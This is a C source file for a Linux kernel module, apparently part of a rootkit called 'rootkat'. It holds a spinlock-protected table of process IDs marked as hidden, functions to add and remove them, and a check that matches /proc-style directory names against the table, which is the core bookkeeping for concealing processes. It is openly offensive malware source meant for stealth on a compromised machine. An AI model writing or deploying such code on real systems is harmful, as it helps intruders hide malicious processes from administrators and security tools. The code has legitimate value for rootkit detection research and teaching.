// SPDX-License-Identifier: MIT
#include <linux/kernel.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include "hidden_pids.h"

static pid_t hidden_pids[ROOTKAT_HIDDEN_PIDS_MAX];
static int hidden_pids_count;
static DEFINE_SPINLOCK(hidden_pids_lock);

void rootkat_hide_pid(pid_t pid)
{
	int i;
	unsigned long flags;

	spin_lock_irqsave(&hidden_pids_lock, flags);
	for (i = 0; i < hidden_pids_count; i++) {
		if (hidden_pids[i] == pid)
			goto out;     /* already hidden */
	}
	if (hidden_pids_count < ROOTKAT_HIDDEN_PIDS_MAX)
		hidden_pids[hidden_pids_count++] = pid;
out:
	spin_unlock_irqrestore(&hidden_pids_lock, flags);
}

void rootkat_unhide_pid(pid_t pid)
{
	int i;
	unsigned long flags;

	spin_lock_irqsave(&hidden_pids_lock, flags);
	for (i = 0; i < hidden_pids_count; i++) {
		if (hidden_pids[i] == pid) {
			hidden_pids[i] = hidden_pids[--hidden_pids_count];
			break;
		}
	}
	spin_unlock_irqrestore(&hidden_pids_lock, flags);
}

bool rootkat_is_pid_hidden(pid_t pid)
{
	int i;
	bool hit = false;
	unsigned long flags;

	spin_lock_irqsave(&hidden_pids_lock, flags);
	for (i = 0; i < hidden_pids_count; i++) {
		if (hidden_pids[i] == pid) {
			hit = true;
			break;
		}
	}
	spin_unlock_irqrestore(&hidden_pids_lock, flags);
	return hit;
}

bool rootkat_is_pid_name_hidden(const char *name, int namlen)
{
	char buf[12];   /* enough for any 32-bit PID + NUL */
	pid_t pid;

	if (namlen <= 0 || namlen >= (int)sizeof(buf))
		return false;
	memcpy(buf, name, namlen);
	buf[namlen] = '\0';

	if (kstrtoint(buf, 10, &pid) != 0)
		return false;

	return rootkat_is_pid_hidden(pid);
}
